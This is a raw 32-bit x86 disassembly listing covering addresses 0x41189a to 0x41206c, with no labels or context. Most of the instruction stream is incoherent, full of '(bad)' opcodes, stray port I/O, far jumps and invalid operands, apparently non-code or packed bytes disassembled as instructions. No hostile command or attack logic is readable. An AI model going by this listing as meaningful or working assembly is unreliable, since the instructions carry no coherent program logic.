  41189a:	popf   
  41189b:	adc    eax,0x13d36aef
  4118a0:	ja     0x4118df
  4118a2:	xor    al,0xac
  4118a4:	mov    al,ds:0x7d59d91
  4118a9:	jmp    0x64126724
  4118ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118af:	test   eax,0x2d573fae
  4118b4:	es sub eax,0x49ffaf8
  4118ba:	enter  0x1247,0x67
  4118be:	sbb    dh,BYTE PTR ds:0xd1dfc5a7
  4118c4:	xor    esi,eax
  4118c6:	repnz loop 0x41193d
  4118c9:	or     dh,BYTE PTR [ebx-0x69f215c9]
  4118cf:	dec    ecx
  4118d0:	pop    esp
  4118d1:	add    esi,esi
  4118d3:	jbe    0x411909
  4118d5:	or     eax,0xb2c1bb5
  4118da:	lods   al,BYTE PTR ds:[esi]
  4118db:	inc    edx
  4118dc:	adc    eax,0x16dff48f
  4118e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118e2:	xchg   esp,eax
  4118e3:	adc    eax,0x57c9b5a5
  4118e8:	mov    al,ds:0x3f13b2af
  4118ed:	stos   DWORD PTR es:[edi],eax
  4118ee:	and    ebx,DWORD PTR [ebx+0x29bf3e71]
  4118f4:	(bad)  
  4118f6:	repnz sti 
  4118f8:	sbb    eax,0xf480d30
  4118fd:	ds std 
  4118ff:	jmp    0x115b:0xc7d3be51
  411906:	cmp    BYTE PTR [esi],dl
  411908:	adc    DWORD PTR [edi],edi
  41190a:	xchg   esi,eax
  41190b:	imul   ebx,ebp,0xffffff86
  41190e:	mov    cs,ebp
  411910:	cdq    
  411911:	out    0x29,eax
  411913:	stc    
  411914:	dec    ecx
  411915:	mov    eax,ds:0xd9b5888f
  41191a:	fnstsw WORD PTR [edi-0x2b905c4d]
  411920:	retf   
  411921:	or     DWORD PTR [eax+0x27],ebp
  411924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411925:	es fwait
  411927:	adc    DWORD PTR [eax-0x67],esi
  41192a:	inc    esi
  41192b:	test   DWORD PTR [ecx],esp
  41192d:	stc    
  41192e:	cmp    eax,DWORD PTR [edx]
  411930:	es mov al,0xb9
  411933:	pop    edi
  411934:	xlat   BYTE PTR ds:[ebx]
  411935:	adc    ebp,edi
  411937:	inc    esp
  411938:	in     al,0x75
  41193a:	icebp  
  41193b:	out    dx,eax
  41193c:	jecxz  0x4118ee
  41193e:	(bad)  
  41193f:	shr    BYTE PTR [eax+0x77ceb4fa],0x23
  411946:	ret    
  411947:	and    al,0x29
  411949:	retf   0xfa77
  41194c:	stos   BYTE PTR es:[edi],al
  41194d:	mov    al,ds:0x447bf1a1
  411952:	mov    ebx,0x679ca9a
  411957:	dec    esi
  411958:	outs   dx,DWORD PTR ds:[esi]
  411959:	aas    
  41195a:	and    ecx,esp
  41195c:	xor    eax,0xf795269f
  411961:	push   ecx
  411962:	mov    ch,0x30
  411964:	stos   DWORD PTR es:[edi],eax
  411965:	or     al,0x95
  411967:	push   ebx
  411968:	dec    edi
  411969:	mov    bl,0x96
  41196b:	addr16 dec eax
  41196d:	jb     0x41198f
  41196f:	inc    esi
  411970:	mov    al,0x6a
  411972:	mov    ebp,0xfa901a8a
  411977:	int3   
  411978:	lods   eax,DWORD PTR ds:[esi]
  411979:	test   eax,0xcb75c109
  41197e:	lahf   
  41197f:	jle    0x4119bd
  411981:	(bad)  
  411982:	loope  0x41198c
  411984:	pop    ds
  411985:	mul    BYTE PTR [ecx+0x50233869]
  41198b:	fidivr DWORD PTR [edi-0x5]
  41198e:	out    0xad,eax
  411990:	das    
  411991:	aad    0x42
  411993:	sbb    DWORD PTR [ebx+0x52],ecx
  411996:	icebp  
  411997:	ficomp DWORD PTR [eax-0x6e638ce7]
  41199d:	mov    esi,0xb22529c9
  4119a2:	hlt    
  4119a3:	cmp    al,0x71
  4119a5:	mov    ch,0x84
  4119a7:	push   ss
  4119a8:	add    DWORD PTR [ebx],edx
  4119aa:	sbb    al,0x64
  4119ac:	fadd   st(5),st
  4119ae:	js     0x41197e
  4119b0:	sbb    DWORD PTR [edx+0x24],ecx
  4119b3:	pusha  
  4119b4:	hlt    
  4119b5:	jo     0x411949
  4119b7:	sub    eax,0xda7a2884
  4119bc:	and    esi,0xfffffffc
  4119bf:	sbb    esi,edx
  4119c1:	mov    ds:0x92109249,eax
  4119c6:	and    ah,dl
  4119c8:	adc    eax,0x731d995d
  4119cd:	push   cs
  4119ce:	in     eax,dx
  4119cf:	rol    ecx,cl
  4119d1:	clc    
  4119d2:	(bad)  
  4119d3:	adc    DWORD PTR [esp+eax*1+0x70e1ec10],esi
  4119da:	(bad)  
  4119db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119dc:	dec    ebx
  4119dd:	in     eax,dx
  4119de:	xor    BYTE PTR [edx-0x4c],cl
  4119e1:	mov    bl,0xd1
  4119e3:	test   al,0x7a
  4119e5:	cmovnp esp,DWORD PTR [ebx-0x14]
  4119e9:	push   0x3
  4119eb:	pop    ebx
  4119ec:	inc    ebx
  4119ed:	xchg   ebx,ecx
  4119ef:	jmp    0x413d7d
  4119f4:	popf   
  4119f5:	add    eax,0xa840804
  4119fa:	xchg   ecx,eax
  4119fb:	adc    bl,0x9b
  4119fe:	pop    eax
  4119ff:	in     al,dx
  411a00:	retf   
  411a01:	mov    bl,0x5d
  411a03:	add    BYTE PTR [ebx],cl
  411a05:	mov    al,BYTE PTR [ebx-0x7ca1f37d]
  411a0b:	sbb    DWORD PTR [ecx-0x5a],0x4f
  411a0f:	add    bh,dl
  411a11:	clc    
  411a12:	cld    
  411a13:	cdq    
  411a14:	pop    eax
  411a15:	ins    DWORD PTR es:[edi],dx
  411a16:	mov    edi,0x7fa31985
  411a1b:	xor    eax,0xc5733e1b
  411a20:	ror    ch,cl
  411a22:	xchg   edx,eax
  411a23:	and    al,0xe7
  411a25:	xchg   esi,eax
  411a26:	and    al,0xf8
  411a28:	aaa    
  411a29:	mov    dh,0xa7
  411a2b:	xchg   edi,eax
  411a2c:	or     al,0xb0
  411a2e:	jl     0x411a95
  411a30:	ds scas eax,DWORD PTR es:[edi]
  411a32:	xchg   edi,eax
  411a33:	mov    cl,0xf3
  411a35:	jnp    0x411a7a
  411a37:	int    0x49
  411a39:	mov    ebx,DWORD PTR [eax+0x1051571c]
  411a3f:	fist   DWORD PTR ds:0x54223b78
  411a45:	mov    es,WORD PTR [ecx-0x56]
  411a48:	mov    esp,0xbf150ed8
  411a4d:	cs cmovo edi,DWORD PTR cs:[edi+0x3a]
  411a53:	(bad)  
  411a54:	idiv   BYTE PTR [edx-0x10ffb7b0]
  411a5a:	retf   0x9653
  411a5d:	push   cs
  411a5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a5f:	xchg   ecx,eax
  411a60:	push   esi
  411a61:	sbb    bl,BYTE PTR [ebx+0x67b9449]
  411a67:	inc    ecx
  411a68:	xlat   BYTE PTR ds:[ebx]
  411a69:	inc    ebp
  411a6a:	xlat   BYTE PTR ds:[ebx]
  411a6b:	jns    0x411a5a
  411a6d:	xchg   ebp,eax
  411a6e:	xor    eax,0x692ba8be
  411a73:	inc    ebp
  411a74:	mov    edi,ecx
  411a76:	inc    esi
  411a77:	mov    dl,cl
  411a79:	dec    esp
  411a7a:	stc    
  411a7b:	addr16 out dx,eax
  411a7d:	out    0x1e,eax
  411a7f:	stos   BYTE PTR es:[edi],al
  411a80:	push   edi
  411a81:	push   edx
  411a82:	(bad)  
  411a83:	sub    DWORD PTR [ecx-0x43],ebx
  411a86:	adc    BYTE PTR [edx+0x42445796],0x48
  411a8d:	xor    al,0x9f
  411a8f:	loopne 0x411a67
  411a91:	jb     0x411a1c
  411a93:	jno    0x411a60
  411a95:	ror    DWORD PTR [ebx],0xcf
  411a98:	and    edx,DWORD PTR [ecx+0x6f]
  411a9b:	ins    BYTE PTR es:[edi],dx
  411a9c:	mov    eax,0xc477e07a
  411aa1:	pusha  
  411aa2:	add    BYTE PTR [eax+ebx*8],al
  411aa5:	or     esp,ebx
  411aa7:	xor    DWORD PTR [eax-0x10f6d760],ecx
  411aad:	in     al,0x5
  411aaf:	xor    eax,0x7154e353
  411ab4:	pusha  
  411ab5:	sub    eax,0x8ad23848
  411aba:	cmp    bl,ch
  411abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411abd:	sbb    bh,BYTE PTR [ebx]
  411abf:	pushf  
  411ac0:	xor    al,0x34
  411ac2:	test   BYTE PTR [ebx],dl
  411ac4:	push   ds
  411ac5:	int3   
  411ac6:	and    DWORD PTR [ebx+0x1c9b1542],esp
  411acc:	mov    cl,0xc8
  411ace:	xor    al,0x92
  411ad0:	mov    eax,ds:0x8697c7f2
  411ad5:	fistp  QWORD PTR [edx]
  411ad7:	je     0x411a75
  411ad9:	dec    edi
  411ada:	test   eax,0x9516ae91
  411adf:	add    eax,0xd116a5a5
  411ae4:	addr16 mov ds:0x44e6,eax
  411ae8:	mov    ecx,0x2b4d4fa4
  411aed:	or     ebx,eax
  411aef:	out    0x8c,eax
  411af1:	fldenv [edx-0x9e29991]
  411af7:	out    0x9e,al
  411af9:	or     esi,DWORD PTR [esi-0x7dc61d03]
  411aff:	mov    fs,WORD PTR [ebx-0x2f]
  411b02:	jae    0x411aa5
  411b04:	lods   al,BYTE PTR ds:[esi]
  411b05:	xchg   esp,eax
  411b06:	fisub  WORD PTR [ebx+eiz*4-0x538464a7]
  411b0d:	std    
  411b0e:	mov    al,ds:0x2d925e26
  411b13:	test   BYTE PTR [edx-0x1df1801d],cl
  411b19:	lea    edi,[ebx]
  411b1b:	fwait
  411b1c:	sbb    ebx,eax
  411b1e:	adc    ecx,DWORD PTR [ebx]
  411b20:	retf   
  411b21:	mov    eax,ds:0x74ad1151
  411b26:	cmp    eax,0x3012faf6
  411b2b:	(bad)  
  411b2c:	lahf   
  411b2d:	push   esp
  411b2e:	lahf   
  411b2f:	jmp    0xfb4d:0x919b6191
  411b36:	cmc    
  411b37:	dec    ecx
  411b38:	(bad)
  411b3b:	mov    ah,0x6e
  411b3d:	pop    edx
  411b3e:	add    dh,BYTE PTR [ebp+0xb]
  411b41:	cdq    
  411b42:	in     al,dx
  411b43:	arpl   WORD PTR [ebx+0x45],bp
  411b46:	mov    dh,0x8a
  411b48:	sti    
  411b49:	pop    ecx
  411b4a:	xchg   edi,eax
  411b4b:	mov    dl,0x75
  411b4d:	(bad)  
  411b4e:	cmc    
  411b4f:	arpl   WORD PTR ds:0xe2f3d50d,bp
  411b55:	xchg   ebx,eax
  411b56:	in     eax,0xd8
  411b58:	push   eax
  411b59:	(bad)  
  411b5a:	sbb    BYTE PTR [ebx+ebp*2-0x61328dea],bh
  411b61:	test   al,0x3f
  411b63:	pop    ecx
  411b64:	adc    DWORD PTR [ebp+0x16283329],esi
  411b6a:	jo     0x411bc6
  411b6c:	xchg   esi,eax
  411b6d:	push   0x6e69ce56
  411b72:	jns    0x411b49
  411b74:	xlat   BYTE PTR ds:[ebx]
  411b75:	jne    0x411b9c
  411b77:	out    dx,al
  411b78:	daa    
  411b79:	mov    bl,0x39
  411b7b:	ins    BYTE PTR es:[edi],dx
  411b7c:	and    ecx,DWORD PTR [edi-0x373f881f]
  411b82:	jp     0x411b5f
  411b84:	les    eax,FWORD PTR [ecx]
  411b86:	xor    bl,bh
  411b88:	shl    BYTE PTR [edx-0x1],1
  411b8b:	pop    ecx
  411b8c:	mov    ?,WORD PTR [edi-0x68]
  411b8f:	push   cs
  411b90:	gs jp  0x411bb1
  411b93:	sbb    eax,0x2b3c800c
  411b98:	push   ss
  411b99:	mov    bl,0xa2
  411b9b:	pop    esp
  411b9c:	pop    esi
  411b9d:	push   ebx
  411b9e:	jle    0x411c0e
  411ba0:	jae    0x411c1e
  411ba2:	data16 sti 
  411ba4:	bound  eax,QWORD PTR [esi]
  411ba6:	int3   
  411ba7:	das    
  411ba8:	icebp  
  411ba9:	adc    DWORD PTR [edx-0x41],edi
  411bac:	mov    esp,0x8c1e4704
  411bb1:	fs cld 
  411bb3:	xchg   BYTE PTR [ebx-0x51],dl
  411bb6:	or     ah,BYTE PTR [ebp+ebp*1+0x7]
  411bba:	fadd   st(0),st
  411bbc:	pop    ds
  411bbd:	push   ecx
  411bbe:	lds    ebx,FWORD PTR [edi]
  411bc0:	enter  0x6a9c,0xa6
  411bc4:	ins    DWORD PTR es:[edi],dx
  411bc5:	test   BYTE PTR [ebp-0x5c],ah
  411bc8:	bound  edi,QWORD PTR [edi+0x62fed3ac]
  411bce:	inc    DWORD PTR [edx-0x1d91350d]
  411bd4:	sbb    BYTE PTR [ecx-0x54],cl
  411bd7:	xor    DWORD PTR [edi-0x5d],esi
  411bda:	adc    BYTE PTR [edx-0x9],0xb7
  411bde:	leave  
  411bdf:	mov    eax,0x4f19cb9
  411be4:	imul   ebp,eax,0x6e
  411be7:	pop    edi
  411be8:	cmp    eax,0x3b6608df
  411bed:	sbb    BYTE PTR ds:0x43298ef4,ch
  411bf3:	fnstenv [edi]
  411bf5:	mov    ecx,0x2934224c
  411bfa:	sbb    al,0xbe
  411bfc:	test   DWORD PTR [ebp-0x15822c36],eax
  411c02:	sub    ah,BYTE PTR [ebx]
  411c04:	daa    
  411c05:	dec    eax
  411c06:	xchg   edi,eax
  411c07:	xlat   BYTE PTR ds:[ebx]
  411c08:	pop    ebp
  411c09:	sbb    BYTE PTR [esi-0x368b88b3],ch
  411c0f:	ins    DWORD PTR es:[edi],dx
  411c10:	sub    bl,BYTE PTR [edx+0x47d471ab]
  411c16:	(bad)  [ecx-0x620865b1]
  411c1c:	adc    DWORD PTR [ecx-0x1a],edi
  411c1f:	test   BYTE PTR [edi],bl
  411c21:	shl    DWORD PTR [esi-0x1ac93f8],0x23
  411c28:	push   esp
  411c29:	pop    es
  411c2a:	add    BYTE PTR [ecx-0x54],cl
  411c2d:	cli    
  411c2e:	das    
  411c2f:	add    BYTE PTR cs:[eax+edx*8-0x26],ch
  411c34:	popf   
  411c35:	hlt    
  411c36:	fs mov ch,0x21
  411c39:	iret   
  411c3a:	push   esi
  411c3b:	xor    eax,0x93178d9c
  411c40:	jo     0x411c74
  411c42:	sti    
  411c43:	popa   
  411c44:	sbb    bl,cl
  411c46:	pop    edi
  411c47:	test   DWORD PTR [esi*4-0x9ecb270],esi
  411c4e:	or     eax,0x83671585
  411c53:	sar    BYTE PTR [esi],1
  411c55:	and    BYTE PTR [esi+0x3e863bb7],bh
  411c5b:	out    0xd9,eax
  411c5d:	mov    ecx,0x144c606e
  411c62:	inc    edi
  411c63:	xchg   edx,eax
  411c64:	cwde   
  411c65:	clc    
  411c66:	dec    esp
  411c67:	or     DWORD PTR [ebp-0x41],esp
  411c6a:	mov    ds:0x7cb5ccb1,eax
  411c6f:	in     eax,0x8c
  411c71:	mov    al,BYTE PTR [eax+edx*4]
  411c74:	mov    bl,ah
  411c76:	in     eax,0x0
  411c78:	or     BYTE PTR [ecx],ah
  411c7a:	cdq    
  411c7b:	mov    ds:0x9fbd7481,al
  411c80:	(bad)  
  411c81:	scas   al,BYTE PTR es:[edi]
  411c82:	leave  
  411c83:	mov    esp,0xe6bc70e7
  411c88:	mov    eax,ds:0xc754ba
  411c8d:	(bad)  
  411c8e:	(bad)  
  411c8f:	cld    
  411c90:	fsubr  QWORD PTR [ecx+edi*2-0x4e473074]
  411c97:	push   edx
  411c98:	push   0xe8bef3c9
  411c9d:	out    dx,eax
  411c9e:	ds scas ax,WORD PTR es:[edi]
  411ca1:	rcr    DWORD PTR [ebx+0x64],1
  411ca4:	aam    0xb1
  411ca6:	inc    ebp
  411ca7:	(bad)  
  411ca8:	dec    edi
  411caa:	inc    ah
  411cac:	jmp    0xb22a:0xcb63b79e
  411cb3:	rol    BYTE PTR [esi-0x139c2222],0x83
  411cba:	sbb    esi,DWORD PTR [edx]
  411cbc:	ret    0x9401
  411cbf:	scas   eax,DWORD PTR es:[edi]
  411cc0:	aam    0x93
  411cc2:	arpl   WORD PTR ds:0x8f406629,bx
  411cc8:	std    
  411cc9:	xor    eax,0x5e4205df
  411cce:	imul   DWORD PTR [ebp-0x30a7e759]
  411cd4:	cli    
  411cd5:	fs popf 
  411cd7:	adc    bh,dh
  411cd9:	ret    0xcd1e
  411cdc:	ret    
  411cdd:	out    0xdf,al
  411cdf:	ins    DWORD PTR es:[edi],dx
  411ce0:	popa   
  411ce1:	es gs retf 
  411ce4:	ins    BYTE PTR es:[edi],dx
  411ce5:	iret   
  411ce6:	sub    dl,BYTE PTR [ebx+0x74]
  411ce9:	add    BYTE PTR [ebp-0x191a23f1],0x5
  411cf0:	imul   ebx,DWORD PTR [ecx-0xe],0x55
  411cf4:	add    eax,0xef3c2c3f
  411cf9:	call   0x6e9f:0x5de77d66
  411d00:	outs   dx,BYTE PTR ds:[esi]
  411d01:	int    0xa3
  411d03:	icebp  
  411d04:	jmp    0x411d84
  411d06:	xlat   BYTE PTR ds:[ebx]
  411d07:	lods   al,BYTE PTR ss:[esi]
  411d09:	retf   
  411d0a:	stc    
  411d0b:	rcr    BYTE PTR [esi+0x622c0982],0x59
  411d12:	test   ch,0x31
  411d15:	sahf   
  411d16:	shr    BYTE PTR [ebx],0x7d
  411d19:	(bad)  ds:0x111634c9
  411d1f:	sar    BYTE PTR [edi+0x25baa5e5],0xfe
  411d26:	daa    
  411d27:	add    edi,DWORD PTR [edx+0x1b]
  411d2a:	lahf   
  411d2b:	in     al,dx
  411d2c:	add    ebx,DWORD PTR [edi-0x42]
  411d2f:	mov    bl,0xfe
  411d31:	mov    ebp,0x874b29f6
  411d36:	lods   al,BYTE PTR ds:[si]
  411d38:	mov    dh,0x22
  411d3a:	pop    edi
  411d3b:	mov    ds:0x5209853f,eax
  411d40:	add    cl,BYTE PTR [ebp-0x7e7746dd]
  411d46:	cmp    BYTE PTR [esi+edi*8],cl
  411d49:	pop    edx
  411d4a:	xor    DWORD PTR [edx-0xb],0x3151413
  411d51:	pop    esp
  411d52:	jo     0x411ce3
  411d54:	ror    DWORD PTR [edx],cl
  411d56:	jmp    0x3c46:0xe84d1c0d
  411d5d:	push   0xffffff9a
  411d5f:	outs   dx,DWORD PTR ds:[esi]
  411d60:	xor    BYTE PTR [edi],al
  411d62:	adc    al,0xe6
  411d64:	iret   
  411d65:	dec    eax
  411d66:	xchg   ebp,eax
  411d67:	adc    DWORD PTR es:0x90afcc2,ecx
  411d6e:	or     al,0x5
  411d70:	sbb    DWORD PTR [edi+0x53],ecx
  411d73:	xchg   ecx,eax
  411d74:	cmp    esi,DWORD PTR [ebx]
  411d76:	pop    eax
  411d77:	out    0xc0,eax
  411d79:	jne    0x411d7c
  411d7b:	push   ds
  411d7c:	jmp    0xf539e9fb
  411d81:	adc    BYTE PTR [ebx-0x71],0xb2
  411d85:	sub    BYTE PTR [ebx+0x180cac30],bl
  411d8b:	pop    esi
  411d8c:	js     0x411d16
  411d8e:	mov    dl,0x34
  411d90:	inc    ecx
  411d91:	mov    edx,0x67f19d9e
  411d96:	cmp    eax,0xee3510d5
  411d9b:	icebp  
  411d9c:	test   cl,ah
  411d9e:	push   cs
  411d9f:	rcl    BYTE PTR [eax-0x497de2a7],cl
  411da5:	mov    ebp,0x23c79ea3
  411daa:	sti    
  411dab:	ret    
  411dac:	push   ds
  411dad:	mov    ebx,0x4d40bba8
  411db2:	sub    BYTE PTR [ebx+ebx*2-0x16feabe8],0xee
  411dba:	xlat   BYTE PTR ds:[ebx]
  411dbb:	inc    edi
  411dbc:	jmp    0x2ac4b399
  411dc1:	fucomi st,st(1)
  411dc3:	cmc    
  411dc4:	cmp    ecx,edi
  411dc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dc7:	test   DWORD PTR [ebx+ebp*2+0x7b],0x1e09bc54
  411dcf:	int    0x89
  411dd1:	xor    cl,BYTE PTR [ebx]
  411dd3:	mov    ?,WORD PTR ds:0xbce47796
  411dd9:	jmp    0x411d77
  411ddb:	sbb    cl,BYTE PTR [ebp+0x2a]
  411dde:	push   es
  411ddf:	mov    ecx,db0
  411de2:	sahf   
  411de3:	or     al,0x9e
  411de5:	inc    esp
  411de6:	inc    esp
  411de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411de8:	mov    esi,0x6a0c45bd
  411ded:	mov    bh,0xbe
  411def:	in     al,dx
  411df0:	in     al,0x6
  411df2:	adc    ecx,DWORD PTR [ecx+eax*4+0x2f72d24]
  411df9:	shl    cl,0x71
  411dfc:	xchg   esi,eax
  411dfd:	add    eax,0x72bd79d1
  411e02:	mov    esi,0xf01217e8
  411e07:	bswap  eax
  411e09:	pop    esi
  411e0a:	jo     0x411deb
  411e0c:	xor    BYTE PTR [edx],bl
  411e0e:	lods   eax,DWORD PTR ds:[esi]
  411e0f:	test   al,0x18
  411e11:	inc    edx
  411e12:	mov    ebp,0xc7d2f8a8
  411e17:	shl    DWORD PTR ds:[edi-0x2925c259],cl
  411e1e:	aam    0xb1
  411e20:	fwait
  411e21:	xlat   BYTE PTR ds:[ebx]
  411e22:	js     0x411ded
  411e24:	jno    0x411e70
  411e26:	adc    BYTE PTR [ebp+0x54],al
  411e29:	aam    0x3a
  411e2b:	cmp    ch,BYTE PTR [edi-0xa]
  411e2e:	adc    DWORD PTR [ebx+0x21132cab],edx
  411e34:	inc    edx
  411e35:	xor    ebx,DWORD PTR [edi+esi*8]
  411e38:	ins    DWORD PTR es:[edi],dx
  411e39:	int3   
  411e3a:	frstor [edx+0x20]
  411e3d:	sbb    ebp,DWORD PTR [eax]
  411e3f:	fisttp DWORD PTR [edx+0x16]
  411e42:	outs   dx,DWORD PTR ds:[esi]
  411e43:	inc    ecx
  411e44:	sbb    BYTE PTR [eax+eax*1+0x6],bh
  411e48:	gs jmp 0x1c14685f
  411e4e:	inc    ebp
  411e4f:	cmp    eax,0x7a092c1c
  411e54:	fdivr  QWORD PTR [esi]
  411e56:	je     0x411e87
  411e58:	je     0x411eb8
  411e5a:	lock inc ebx
  411e5c:	ins    DWORD PTR es:[edi],dx
  411e5d:	jae    0x411e89
  411e5f:	jl     0x411e07
  411e61:	mov    bl,0x59
  411e63:	mov    BYTE PTR [ecx],0x5a
  411e66:	ret    0x3e3e
  411e69:	aad    0xc7
  411e6b:	jne    0x411e5e
  411e6d:	jbe    0x411ece
  411e6f:	test   DWORD PTR [ecx+0x6efc1411],0x942f1d62
  411e79:	sbb    cl,dl
  411e7b:	bswap  ebp
  411e7d:	fmul   QWORD PTR ds:[ecx-0x6578ef8]
  411e84:	jecxz  0x411e4a
  411e86:	ss push ss
  411e88:	jb     0x411e61
  411e8a:	iret   
  411e8b:	jo     0x411eef
  411e8d:	pop    es
  411e8e:	mov    esi,0x99c0865d
  411e93:	sbb    BYTE PTR [ebp-0x1b9b7af5],0x77
  411e9a:	out    dx,al
  411e9b:	and    eax,0xca6249d0
  411ea0:	add    al,0x99
  411ea2:	shl    BYTE PTR es:[eax],cl
  411ea5:	loope  0x411e97
  411ea7:	inc    edx
  411ea8:	je     0x411e9b
  411eaa:	or     ebp,DWORD PTR [eax-0x1c]
  411ead:	lods   eax,DWORD PTR ds:[esi]
  411eae:	add    DWORD PTR gs:[eax],0x50
  411eb2:	cmc    
  411eb3:	cmp    BYTE PTR [ebp+0x60],bh
  411eb6:	(bad)  
  411eb7:	cdq    
  411eb8:	mov    ebp,0xe6c75a14
  411ebd:	mov    BYTE PTR ds:0x6408e0f0,ah
  411ec3:	push   ss
  411ec4:	out    dx,eax
  411ec5:	test   al,0xe0
  411ec7:	and    edi,ebp
  411ec9:	dec    esi
  411eca:	or     BYTE PTR [ecx+ebx*1],bh
  411ecd:	sbb    eax,0x1c182c5f
  411ed2:	icebp  
  411ed3:	fwait
  411ed4:	and    bl,BYTE PTR [edx+0x18487fe0]
  411eda:	lock mov edx,0x16451727
  411ee0:	mov    bh,0x2c
  411ee2:	and    al,0x5c
  411ee4:	sbb    DWORD PTR [edx-0xd3b127b],esi
  411eea:	push   edi
  411eeb:	ficom  DWORD PTR [ecx]
  411eed:	jle    0x411ea3
  411eef:	js     0x411eb5
  411ef1:	and    DWORD PTR [eax-0x17],eax
  411ef4:	sti    
  411ef5:	jns    0x411f37
  411ef7:	or     eax,0xc17f3e41
  411efc:	les    ebx,FWORD PTR [edi+0x39]
  411eff:	scas   al,BYTE PTR es:[edi]
  411f00:	sbb    eax,0xd32934b8
  411f05:	sub    eax,0xe4da1f4a
  411f0a:	es mov ah,0x24
  411f0d:	sub    eax,0x8e75f748
  411f12:	and    edx,ebp
  411f14:	mov    ah,0xb7
  411f16:	xlat   BYTE PTR ds:[ebx]
  411f17:	push   0x3854ceb8
  411f1c:	add    ecx,edi
  411f1e:	ds stos DWORD PTR es:[edi],eax
  411f20:	popf   
  411f21:	lods   eax,DWORD PTR ds:[esi]
  411f22:	or     edi,ecx
  411f24:	aad    0x58
  411f26:	cmc    
  411f27:	fst    DWORD PTR [eax+0x2e4888a1]
  411f2d:	loop   0x411f7e
  411f2f:	mov    al,ds:0xda179d5b
  411f34:	and    al,0x5c
  411f36:	sub    ecx,DWORD PTR [ebp+0x57bc72d0]
  411f3c:	(bad)  
  411f3d:	hlt    
  411f3e:	out    dx,al
  411f3f:	sbb    BYTE PTR [eax-0x2933ba7f],dl
  411f45:	lock ror BYTE PTR cs:[ebp-0x441d8233],0x8e
  411f4e:	pop    ebx
  411f4f:	into   
  411f50:	push   ebx
  411f51:	out    dx,eax
  411f52:	push   cs
  411f53:	jnp    0x411f73
  411f55:	int3   
  411f56:	(bad)  
  411f58:	jge    0x411f4e
  411f5a:	fisttp QWORD PTR [eax]
  411f5c:	mov    dh,0x5d
  411f5e:	and    eax,DWORD PTR [edx-0x70]
  411f61:	and    eax,esp
  411f63:	pop    edi
  411f64:	dec    eax
  411f65:	cwde   
  411f66:	or     al,0x82
  411f68:	lds    esp,FWORD PTR [eax+0x1545d400]
  411f6e:	scas   al,BYTE PTR es:[edi]
  411f6f:	inc    eax
  411f70:	cmp    DWORD PTR [esi+ecx*2+0x3226c53e],esi
  411f77:	mov    al,ds:0x96e9a9e2
  411f7c:	gs loopne 0x411f3e
  411f7f:	out    0x6e,al
  411f81:	mov    DWORD PTR [ecx+0xd],esp
  411f84:	rol    DWORD PTR [ecx-0x15ce7b6e],0xef
  411f8b:	test   eax,0xbd7e5ceb
  411f90:	pop    ecx
  411f91:	jecxz  0x411f33
  411f93:	inc    esp
  411f94:	and    eax,0xaf7a2981
  411f99:	adc    dh,BYTE PTR [eax+0x6aff5df0]
  411f9f:	xor    bh,BYTE PTR [edx]
  411fa1:	rol    DWORD PTR ds:[ebx+esi*2-0x15991d2c],1
  411fa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411faa:	pushf  
  411fab:	stos   DWORD PTR es:[edi],eax
  411fac:	jbe    0x411f72
  411fae:	pop    ecx
  411faf:	jbe    0x411fdd
  411fb1:	loop   0x411f89
  411fb3:	out    0xe7,al
  411fb5:	ins    BYTE PTR es:[edi],dx
  411fb6:	iret   
  411fb7:	je     0x411fd9
  411fb9:	mov    edx,0x77357308
  411fbe:	mov    esp,0x7ab0bebf
  411fc3:	fistp  WORD PTR [edx]
  411fc5:	xchg   esp,eax
  411fc6:	in     ax,dx
  411fc8:	gs push ebp
  411fca:	inc    ecx
  411fcb:	shl    BYTE PTR ds:0x5d658478,0x24
  411fd2:	ffree  st(3)
  411fd4:	sub    DWORD PTR [edx+0x35b3008c],edx
  411fda:	imul   edi,DWORD PTR [ebp-0x11d1d836],0x91c47089
  411fe4:	cmp    esp,DWORD PTR [ebp-0x64]
  411fe7:	push   ds
  411fe8:	xchg   ebp,eax
  411fe9:	add    BYTE PTR [ecx-0x5a8fddc9],ch
  411fef:	mov    ecx,0x7a518a7d
  411ff4:	sbb    DWORD PTR [edx],0x1e
  411ff7:	push   ebp
  411ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ff9:	push   ds
  411ffa:	fmulp  st(6),st
  411ffc:	jmp    0x3758114e
  412001:	cmp    al,0xc2
  412003:	push   0xffffff89
  412005:	xchg   BYTE PTR [esp+ebx*8-0x30],cl
  412009:	loopne 0x41207c
  41200b:	cs loopne 0x411fb3
  41200e:	xchg   esp,eax
  41200f:	out    dx,al
  412010:	dec    esp
  412011:	sti    
  412012:	inc    ebp
  412013:	xor    al,0xd6
  412015:	sub    dh,BYTE PTR [esi]
  412017:	int    0xd8
  412019:	cmp    al,BYTE PTR [edx-0x70]
  41201c:	jecxz  0x412047
  41201e:	popa   
  41201f:	dec    esp
  412020:	hlt    
  412021:	mov    cl,0xbf
  412023:	fneni(8087 only) 
  412025:	(bad)  
  412026:	cmp    BYTE PTR ds:0x5b87b04,ah
  41202c:	jle    0x411fec
  41202e:	out    0x9d,eax
  412030:	aam    0xa7
  412032:	sub    eax,0xb42f359c
  412037:	sub    eax,0x1b3f9ae5
  41203c:	mov    bl,0x8b
  41203e:	xchg   DWORD PTR [edi+ebx*2+0x28],ecx
  412042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412043:	cmp    ah,ch
  412045:	mov    ebx,0x58d48e86
  41204a:	jbe    0x412047
  41204c:	mov    ds:0x44b34893,al
  412051:	xchg   edi,eax
  412052:	fcmovne st,st(0)
  412054:	js     0x412053
  412056:	pop    ebx
  412057:	ins    DWORD PTR es:[edi],dx
  412058:	and    eax,0x71fe64fe
  41205d:	stos   BYTE PTR es:[edi],al
  41205e:	repnz pop ecx
  412060:	or     al,0xf
  412062:	sub    DWORD PTR [eax-0x21],eax
  412065:	xor    al,0xb2
  412067:	sub    esi,eax
  412069:	lahf   
  41206a:	push   ds
  41206b:	pop    eax
  41206c:	jl     0x411fef
